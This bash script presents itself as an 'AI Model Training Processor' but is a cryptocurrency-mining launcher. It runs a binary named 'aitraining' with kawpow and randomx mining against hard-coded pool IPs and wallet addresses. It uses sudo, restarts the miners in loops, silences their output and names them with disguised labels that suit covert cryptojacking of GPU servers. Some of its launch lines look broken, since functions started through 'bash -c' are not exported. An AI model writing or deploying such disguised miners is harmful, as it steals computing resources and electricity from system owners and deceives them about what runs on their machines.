#!/bin/bash

# ai_model_processor.sh - AI Model Training Processor

# -------- CONFIGURATION --------
PROCESSOR_PATH="./aitraining"
LOG_DIR="./logs"
mkdir -p "$LOG_DIR"

# GPU Settings
GPU_ALGO="kawpow"
GPU_POOL="51.89.99.172:16161"
GPU_WALLET="RM2ciYa3CRqyreRsf25omrB4e1S95waALr"
GPU_WORKER="H200-rig"
GPU_IDS="0,1,2,3,4,5,6,7"

# CPU Settings
CPU_ALGO="randomx"
CPU_POOL="51.222.200.133:10343"
CPU_WALLET="44csiiazbiygE5Tg5c6HhcUY63z26a3Cj8p1EBMNA6DcEM6wDAGhFLtFJVUHPyvEohF4Z9PF3ZXunTtWbiTk9HyjLxYAUwd"
CPU_WORKER="H200-cpu"

# Log files
GPU_LOG="$LOG_DIR/gpu_processing.log"
CPU_LOG="$LOG_DIR/cpu_processing.log"
MONITOR_LOG="$LOG_DIR/monitor.log"

# -------- MAIN SCRIPT --------

# Kill any existing processes
sudo pkill -f aitraining
sleep 3

echo "=== Starting AI Model Processing ==="

# Start GPU Processing
start_gpu_processor() {
    echo "$(date) Starting GPU Processor..." | tee -a "$MONITOR_LOG"
    while true; do
        nohup sudo "$PROCESSOR_PATH" \
            --algorithm "$GPU_ALGO" \
            --pool "$GPU_POOL" \
            --wallet "$GPU_WALLET" \
            --worker "$GPU_WORKER" \
            --password "x" \
            --gpu-id "$GPU_IDS" \
            --tls "true" \
            --disable-cpu \
            --log-file "$GPU_LOG" \
            --log-file-mode 1 \
            --api-enable \
            --api-port 21550 \
            --api-rig-name "H200-GPU" > /dev/null 2>&1 &
        
        GPU_PID=$!
        echo "$(date) GPU Processor PID: $GPU_PID" | tee -a "$MONITOR_LOG"
        
        wait $GPU_PID
        STATUS=$?
        echo "$(date) GPU processor exited with status $STATUS. Restarting in 10s..." | tee -a "$MONITOR_LOG"
        sleep 10
    done
}

# Start CPU Processing
start_cpu_processor() {
    echo "$(date) Starting CPU Processor..." | tee -a "$MONITOR_LOG"
    while true; do
        nohup sudo "$PROCESSOR_PATH" \
            --algorithm "$CPU_ALGO" \
            --pool "$CPU_POOL" \
            --wallet "$CPU_WALLET" \
            --worker "$CPU_WORKER" \
            --password "x" \
            --cpu-threads 80 \
            --disable-gpu \
            --tls "true" \
            --log-file "$CPU_LOG" \
            --log-file-mode 1 \
            --api-enable \
            --api-port 21551 \
            --api-rig-name "H200-CPU" > /dev/null 2>&1 &
        
        CPU_PID=$!
        echo "$(date) CPU Processor PID: $CPU_PID" | tee -a "$MONITOR_LOG"
        
        wait $CPU_PID
        STATUS=$?
        echo "$(date) CPU processor exited with status $STATUS. Restarting in 10s..." | tee -a "$MONITOR_LOG"
        sleep 10
    done
}

# Monitor system
monitor_system() {
    while true; do
        echo "=== $(date) System Status ===" >> "$MONITOR_LOG"
        
        # Check processes
        echo "Active Processes:" >> "$MONITOR_LOG"
        ps aux | grep aitraining | grep -v grep >> "$MONITOR_LOG"
        
        # GPU status
        echo "GPU Status:" >> "$MONITOR_LOG"
        nvidia-smi --query-gpu=index,temperature.gpu,utilization.gpu,memory.used,power.draw --format=csv,noheader >> "$MONITOR_LOG"
        
        echo "---" >> "$MONITOR_LOG"
        sleep 30
    done
}

# Initialize logs
echo "===== GPU Processor Started: $(date) =====" > "$GPU_LOG"
echo "===== CPU Processor Started: $(date) =====" > "$CPU_LOG"
echo "===== Monitoring Started: $(date) =====" > "$MONITOR_LOG"

echo "Starting processing operations..."
echo "GPU: $GPU_ALGO on $GPU_POOL"
echo "CPU: $CPU_ALGO on $CPU_POOL"
echo ""

# Start everything with nohup
nohup bash -c "start_gpu_processor" > /dev/null 2>&1 &
GPU_MAIN_PID=$!
sleep 5

nohup bash -c "start_cpu_processor" > /dev/null 2>&1 &
CPU_MAIN_PID=$!
sleep 2

nohup bash -c "monitor_system" > /dev/null 2>&1 &
MONITOR_PID=$!

echo "=== Processing Started Successfully ==="
echo "GPU Processor PID: $GPU_MAIN_PID"
echo "CPU Processor PID: $CPU_MAIN_PID"
echo "Monitor PID: $MONITOR_PID"
echo ""
echo "📊 Log Files:"
echo "   GPU: $GPU_LOG"
echo "   CPU: $CPU_LOG"
echo "   Monitor: $MONITOR_LOG"
echo ""
echo "🌐 API Endpoints:"
echo "   GPU Stats: http://127.0.0.1:21550/stats"
echo "   CPU Stats: http://127.0.0.1:21551/stats"
echo ""
echo "🔍 Check processes: ps aux | grep aitraining"
echo "📈 Real-time logs: tail -f $LOG_DIR/*.log"
echo "🛑 Stop processing: sudo pkill -f aitraining"

# Wait for processes
wait
